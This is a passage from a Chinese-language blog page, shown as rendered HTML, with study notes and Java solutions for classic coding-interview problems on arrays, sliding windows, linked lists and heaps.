class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">minNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>        String[] strs = <span class="hljs-keyword">new</span> String[nums.length];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; strs.length; i++) &#123;<br>            strs[i] = String.valueOf(nums[i]);<br>        &#125;<br>        Arrays.sort(strs, (x, y) -&gt; &#123;<br>            <span class="hljs-keyword">return</span> ((x + y).compareTo(y + x));<br>        &#125;);<br>        StringBuilder res = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-comment">// 字符串数组转成字符串</span><br>        <span class="hljs-keyword">for</span> (String s : strs) &#123;<br>            res.append(s);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="1-16-和为s的连续正数序列"><a href="#1-16-和为s的连续正数序列" class="headerlink" title="1.16 和为s的连续正数序列"></a>1.16 和为s的连续正数序列</h2><p>​    题目：输入一个正整数 target ，输出所有和为 target 的连续正整数序列（至少含有两个数）。</p><p>序列内的数字由小到大排列，不同序列按照首个数字从小到大排列。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[][] findContinuousSequence(<span class="hljs-keyword">int</span> target) &#123;<br>    <span class="hljs-comment">//i是左边界，j是有边界，sum是滑动窗口中数字的和</span><br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;<br>    List&lt;<span class="hljs-keyword">int</span>[]&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>    <span class="hljs-keyword">while</span> (i &lt;= target / <span class="hljs-number">2</span>)&#123;<br>        <span class="hljs-keyword">if</span> (sum &lt; target)&#123;<br>            sum += j;<br>            j++;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sum &gt; target)&#123;<br>            sum -= i;<br>            i++;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">int</span>[] arr = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[j-i];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = i; k &lt; j; k++)&#123;<br>                arr[k - i] = k;<br>            &#125;<br>            res.add(arr);<br>            <span class="hljs-comment">//左边界向右移动，开始计算下一轮结果</span><br>            sum -= i;<br>            i++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res.toArray(<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[res.size()][]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-17-滑动窗口的最大值"><a href="#1-17-滑动窗口的最大值" class="headerlink" title="1.17 滑动窗口的最大值"></a>1.17 滑动窗口的最大值</h2><p>​    题目：给定一个数组 <code>nums</code> 和滑动窗口的大小 <code>k</code>，请找出所有滑动窗口里的最大值。</p><p>​    设窗口区间为$ [i, j]$ ，最大值为 $x_j$  。当窗口向前移动一格，则区间变为 $[i+1,j+1]$ ，即添加了 $nums[j + 1]$，删除了 $nums[i]$。</p><p>​    若只向窗口 $[i,j]$ 右边添加数字 $nums[j+1]$ ，则新窗口最大值可以 通过一次对比 使用 O(1) 时间得到，即：</p><script type="math/tex; mode=display">x_{j+1} = \max(x_{j}, nums[j + 1])</script><p>​    而删除的nums[i] 可能恰好是窗口内唯一的最大值 $x<em>j$  ，因此不能通过以上方法计算$ x</em>{j+1}$，而必须使用 O(j-i) 时间， 遍历整个窗口区间 获取最大值，即：</p><script type="math/tex; mode=display">x_{j+1} = \max(nums(i+1), \cdots , num(j+1))</script><p>​    根据以上分析，可得 暴力法 的时间复杂度为 $O((n-k+1)k) \approx O(nk)$ 。</p><p>​    设数组 nums 的长度为 n ，则共有 (n-k+1)个窗口；<br>​    获取每个窗口最大值需线性遍历，时间复杂度为 O(k) 。</p><p>​    要想在O(1)的时间复杂度取出最大值，可以考虑单调栈的实现方式，但栈的元素进出都在一边，因此可以使用双端队列的数据结构，并维护为单调队列。遍历数组滑动窗口时，保证单调队列deque:</p><ol><li>deque内仅包含窗口内的元素，每次窗口滑动移除了元素 $nums[i - 1]$ ，需将 $deque$ 内的对应元素一起删除。</li><li>deque 内的元素 非严格递减 ⇒ 每轮窗口滑动添加了元素 nums[j + 1]，需将deque 内所有 &lt; nums[j + 1]的元素删除。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] maxSlidingWindow(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k) &#123;<br>    <span class="hljs-keyword">if</span>(nums.length == <span class="hljs-number">0</span> || k == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];&#125;<br>    Deque&lt;Integer&gt; deque = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length - k +<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//未形成窗口区间</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++)&#123;<br>        <span class="hljs-comment">//每次加入元素时保证队列递减</span><br>        <span class="hljs-keyword">while</span> (!deque.isEmpty() &amp;&amp; nums[i] &gt; deque.peekLast())&#123;<br>            deque.removeLast();<br>        &#125;<br>        deque.addLast(nums[i]);<br>    &#125;<br>    <span class="hljs-comment">//窗口区间形成后，把队列首位添加到结果中</span><br>    <span class="hljs-comment">//因为窗口形成后，就需要把队列首位添加到数组中，而下面的循环是直接跳过这一步的，所以需要我们直接添加</span><br>    res[index++] = deque.peekFirst();<br>    <span class="hljs-comment">//窗口区间形成</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = k;i &lt; nums.length; i++)&#123;<br>        <span class="hljs-comment">//删除上一个窗口的元素</span><br>        <span class="hljs-keyword">if</span> (deque.peekFirst() == nums[i - k])&#123;deque.removeFirst();&#125;<br>        <span class="hljs-keyword">while</span> (!deque.isEmpty() &amp;&amp; deque.peekLast() &lt; nums[i])&#123;<br>            deque.removeLast();<br>        &#125;<br>        deque.addLast(nums[i]);<br>        res[index++] = deque.peekFirst();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="2-链表"><a href="#2-链表" class="headerlink" title="2. 链表"></a>2. 链表</h1><h2 id="2-1-从尾到头打印链表"><a href="#2-1-从尾到头打印链表" class="headerlink" title="2.1 从尾到头打印链表"></a>2.1 从尾到头打印链表</h2><p>​    题目：输入一个链表，按链表从尾到头的顺序返回一个ArrayList。</p><p>​    倒转链表，联想到栈的后进先出的结构。</p><p>​    我的想法是使用array List作为栈接收，然后再pop到一个新的数组，这里用的Collections.reverse(arrayList);</p><p>​    <font color = 'red'>直接想最优情况，不行再退步寻求次一级情况</font>，首先链表必须遍历一遍，是否可以直接让链表中的元素插入数组时就是反转好的呢，更好的方法是利用list.add(index,value)方法可以在指定位置插入值的特性使用头插法在遍历 listNode 的同时将每个遇到的值插入到 list 的 0 位置，最后输出 listNode 即可得到逆序链表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListNode</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    ListNode next;   <span class="hljs-comment">// 下一个链表对象</span><br>    ListNode(<span class="hljs-keyword">int</span> x) &#123;<br>        val = x;<br>    &#125;  <span class="hljs-comment">//赋值链表的值</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JZ3</span> </span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 输入一个链表，按链表从尾到头的顺序返回一个ArrayList。</span><br><span class="hljs-comment">    */</span><br><br><br>    <span class="hljs-comment">// 1.使用了Collections进行array list反转</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ArrayList&lt;Integer&gt; <span class="hljs-title">printListFromTailToHead1</span><span class="hljs-params">(ListNode listNode)</span> </span>&#123;<br>        ArrayList&lt;Integer&gt; arrayList = <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>        <span class="hljs-keyword">if</span> (listNode==<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">return</span> arrayList;<br>        &#125;<br>        <span class="hljs-keyword">do</span> &#123;<br>            arrayList.add(listNode.val);<br>            listNode = listNode.next;<br>        &#125;<span class="hljs-keyword">while</span> (listNode!=<span class="hljs-keyword">null</span>);<br>        Collections.reverse(arrayList);<br>        <span class="hljs-keyword">return</span> arrayList;<br>    &#125;<br>    <span class="hljs-comment">//  牛客更巧妙的方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ArrayList&lt;Integer&gt; <span class="hljs-title">printListFromTailToHead2</span><span class="hljs-params">(ListNode listNode)</span> </span>&#123;<br>        ArrayList&lt;Integer&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        ListNode tmp = listNode;<br>        <span class="hljs-keyword">while</span>(tmp!=<span class="hljs-keyword">null</span>)&#123;<br>            list.add(<span class="hljs-number">0</span>,tmp.val);<br>            tmp = tmp.next;<br>        &#125;<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-删除链表的节点"><a href="#2-2-删除链表的节点" class="headerlink" title="2.2 删除链表的节点"></a>2.2 删除链表的节点</h2><p>​    题目：给定单向链表的头指针和一个要删除的节点的值，定义一个函数删除该节点。返回删除后的链表的头节点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">deleteNode</span><span class="hljs-params">(ListNode head, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head.val == val)&#123;<br>        head = head.next;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    ListNode p1 = head;<br>    ListNode p2 = head.next;<br><br>    <span class="hljs-keyword">while</span>(p2 != <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">if</span> (p2.val != val)&#123;<br>            p1 = p1.next;<br>            p2 = p2.next;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            p1.next = p2.next;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br><br><br>    <span class="hljs-keyword">return</span> head;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-链表中倒数第k个结点"><a href="#2-3-链表中倒数第k个结点" class="headerlink" title="2.3 链表中倒数第k个结点"></a>2.3 链表中倒数第k个结点</h2><p>​    题目：输入一个链表，输出该链表中倒数第k个结点。<font color='red'>快慢指针</font></p><p>​    思路1：将链表倒过来再从头开始遍历</p><p>​    思路2：将链表放在linkedlist中利用previous，因为java中linkedlist是双向链表。</p><p>​    思路3：假设整个链表有n个结点，那么倒数第k个结点就是从头结点开始的第n-k+1个结点。如果我们能够得到链表中结点的个数n，那我们只要从头结点开始往后走n-k+1步就可以了。如何得到结点数n?这个不难，只需要<br>从头开始遍历链表，每经过一个结点，计数器加1就行了。这样做的坏处是需要遍历两次</p><p>​    思路4：为了实现只遍历链表一次就能找到倒数第k个结点，我们可以定义两个指针。第-一个指针从链表的头指针开始遍历向前走k-1，第二个指针保持不动;从第k步开始，第二个指针也开始从链表的头指针开始遍历。由于两个指针的距离保持在k-1，当第一个〈走在前面的）指针到达链表的尾结点时，第二个指针（走在后面的）指针正好是倒数第k个结点。</p><p>​    思路4代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">FindKthToTail</span><span class="hljs-params">(ListNode head,<span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-keyword">null</span>||k&lt;=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    ListNode listNode1 = head;<br>    ListNode listNode2 = head;<br>    <span class="hljs-keyword">int</span> count = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (count &gt;= k)&#123;<br>            listNode2 = listNode2.next;<br>        &#125;<br>        listNode1 = listNode1.next;<br>        count++;<br>    &#125; <span class="hljs-keyword">while</span> (listNode1.next != <span class="hljs-keyword">null</span>);<br>    <span class="hljs-keyword">if</span> (count &lt; k)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> listNode2;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-4-反转链表"><a href="#2-4-反转链表" class="headerlink" title="2.4 反转链表"></a>2.4 反转链表</h2><p>​    题目：输入一个链表，反转链表后，输出新链表的表头。</p><p>​    思路1：可以额外开辟数组空间辅助解决</p><p>​    思路2：将第一个结点摘下，后续结点头插法插入</p><p>​    代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">ReverseList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (head.next == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    ListNode p = head.next;<br>    ListNode r;<br>    head.next = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">while</span>(p.next!=<span class="hljs-keyword">null</span>)&#123;<br>        r = p.next;<br>        p.next = head;<br>        head = p;<br>        p = r;<br>    &#125;<br>    p.next = head;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    需要注意的是输入结点为空和输入结点为1的情况，以及进入循环之前必须置head.next=null进行断链，否则产生循环链表报错。</p><p>也可在头结点之前添加辅助结点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode head)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (head == <span class="hljs-keyword">null</span> || head.next == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> head;<br>    &#125;<br>    ListNode p = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>    p.next = head;<br>    ListNode tmp = head.next;<br>    head.next = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">while</span> (tmp != <span class="hljs-keyword">null</span>) &#123;<br>        ListNode r =  tmp.next;<br>        tmp.next = p.next;<br>        p.next = tmp;<br>        tmp = r;<br>    &#125;<br>    <span class="hljs-keyword">return</span> p.next;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-5-合并两个排序的链表"><a href="#2-5-合并两个排序的链表" class="headerlink" title="2.5 合并两个排序的链表"></a>2.5 合并两个排序的链表</h2><p>​    题目：输入两个单调递增的链表，输出两个链表合成后的链表，当然我们需要合成后的链表满足单调不减规则。</p><p>​    显然是个排序问题。</p><p>​    思路：将两个链表的值不断比较，值小的链接到新链表（Java中没有指针，不能完成无辅助空间操作）。</p><p>​    关键技巧：一般创建单链表，都会设一个虚拟头结点，也叫哨兵，因为这样每一个结点都有一个前驱结点。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">Merge</span><span class="hljs-params">(ListNode list1, ListNode list2)</span> </span>&#123;<br>    ListNode list = <span class="hljs-keyword">new</span> ListNode(-<span class="hljs-number">1</span>);<br>    ListNode cur;<br>    cur = list;<br>    <span class="hljs-keyword">while</span> (list1 != <span class="hljs-keyword">null</span> &amp;&amp; list2 != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (list1.val &lt;= list2.val) &#123;<br>            list.next = list1;<br>            list1 = list1.next;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            list.next = list2;<br>            list2 = list2.next;<br>        &#125;<br>        list = list.next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (list1 == <span class="hljs-keyword">null</span>) &#123;<br>        list.next = list2;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (list2 == <span class="hljs-keyword">null</span>) &#123;<br>        list.next = list1;<br>    &#125;<br>    <span class="hljs-keyword">return</span> cur.next;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-6-复杂链表的复制"><a href="#2-6-复杂链表的复制" class="headerlink" title="2.6 复杂链表的复制"></a>2.6 复杂链表的复制</h2><p>​    题目：请实现 copyRandomList 函数，复制一个复杂链表。在复杂链表中，每个节点除了有一个 next 指针指向下一个节点，还有一个 random 指针指向链表中的任意节点或者 null。</p><p>​    给定链表的头节点 head ，复制普通链表很简单，只需遍历链表，每轮建立新节点 + 构建前驱节点 pre 和当前节点 node 的引用指向即可。</p><p>​    本题链表的节点新增了 random 指针，指向链表中的 <strong>任意节点</strong> 或者 <em>null</em> 。这个 random 指针意味着在复制过程中，除了构建前驱节点和当前节点的引用指向 pre.next ，还要构建前驱节点和其随机节点的引用指向 pre.random 。</p><p><strong>本题难点</strong>： 在复制链表的过程中构建新链表各节点的 random 引用指向。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/1604747285-ELUgCd-Picture1.png" alt="Picture1.png" style="zoom: 33%;" /></p><p>​    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Node <span class="hljs-title">copyRandomList</span><span class="hljs-params">(Node head)</span> </span>&#123;<br>       Node cur = head;<br>       Node dum = <span class="hljs-keyword">new</span> Node(<span class="hljs-number">0</span>), pre = dum;<br>       <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span>) &#123;<br>           Node node = <span class="hljs-keyword">new</span> Node(cur.val); <span class="hljs-comment">// 复制节点 cur</span><br>           pre.next = node;               <span class="hljs-comment">// 新链表的 前驱节点 -&gt; 当前节点</span><br>           <span class="hljs-comment">// pre.random = &quot;???&quot;;         // 新链表的前驱结点的random结点无法复制，因为此时random结点可能还没出现在新链表上</span><br>           cur = cur.next;                <span class="hljs-comment">// 遍历下一节点</span><br>           pre = node;                    <span class="hljs-comment">// 保存当前新节点</span><br>       &#125;<br>       <span class="hljs-keyword">return</span> dum.next;<br>   &#125;<br><br><br></code></pre></td></tr></table></figure><p>​    创建一个HashMap<Node,Node>，前面的Node是原来的Nodefui，后面的Node是复制的Node。先把原来的结点值复制，再复制只指向（）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Node <span class="hljs-title">copyRandomList</span><span class="hljs-params">(Node head)</span> </span>&#123;<br>    HashMap&lt;Node,Node&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    Node cur = head;<br><span class="hljs-comment">//复制结点值</span><br>    <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span>)&#123;<br>        map.put(cur,<span class="hljs-keyword">new</span> Node(cur.val));<br>        cur = cur.next;<br>    &#125;<br>    <span class="hljs-comment">//复制结点指向</span><br>    cur = head;<br>    <span class="hljs-keyword">while</span> (cur != <span class="hljs-keyword">null</span>)&#123;<br>        map.get(cur).next = map.get(cur.next);<br>        map.get(cur).random = map.get(cur.random);<br>        cur = cur.next;<br>    &#125;<br>    <span class="hljs-comment">//返回复制链表</span><br>    <span class="hljs-keyword">return</span> map.get(head);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-7-两个链表中的第一个公共结点"><a href="#2-7-两个链表中的第一个公共结点" class="headerlink" title="2.7 两个链表中的第一个公共结点"></a>2.7 两个链表中的第一个公共结点</h2><p>​    题目：输入两个链表，找出它们的第一个公共节点。如下面的两个链表：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/160_statement.png" alt="img" style="zoom: 67%;" /></p><p>​    在节点 c1 开始相交。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode headA, ListNode headB)</span> </span>&#123;<br>       ListNode p1 = headA;<br>       ListNode p2 = headB;<br><br>       <span class="hljs-keyword">while</span> (p1 != p2)&#123;<br>           <span class="hljs-keyword">if</span> (p1 == <span class="hljs-keyword">null</span>)&#123;<br>               p1 = headB;<br>           &#125;<span class="hljs-keyword">else</span> &#123;<br>               p1 = p1.next;<br>           &#125;<br>           <span class="hljs-keyword">if</span> (p2 == <span class="hljs-keyword">null</span>)&#123;<br>               p2 = headA;<br>           &#125;<span class="hljs-keyword">else</span> &#123;<br>               p2 = p2.next;<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> p1;<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="3-堆"><a href="#3-堆" class="headerlink" title="3. 堆"></a>3. 堆</h1><h2 id="3-1-最小的k个数"><a href="#3-1-最小的k个数" class="headerlink" title="3.1 最小的k个数"></a>3.1 最小的k个数</h2><p>​    题目：输入整数数组 <code>arr</code> ，找出其中最小的 <code>k</code> 个数。例如，输入4、5、1、6、2、7、3、8这8个数字，则最小的4个数字是1、2、3、4。</p><p>方法一：直接排序</p><p>​    对原数组从小到大排序后取出前 k 个数即可。</p><p>方法二：堆</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**输入整数数组 arr ，找出其中最小的 k 个数。例如，</span><br><span class="hljs-comment"> * 输入4、5、1、6、2、7、3、8这8个数字，则最小的4个数字是1、2、3、4。*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] getLeastNumbers(<span class="hljs-keyword">int</span>[] arr, <span class="hljs-keyword">int</span> k) &#123;<br>    <span class="hljs-keyword">if</span>(arr.length == <span class="hljs-number">0</span> || k == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-comment">//PriorityQueue默认是小根堆，实现大根堆重写比较器</span><br>    Queue&lt;Integer&gt; pq = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;((v1,v2)-&gt;(v2-v1));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : 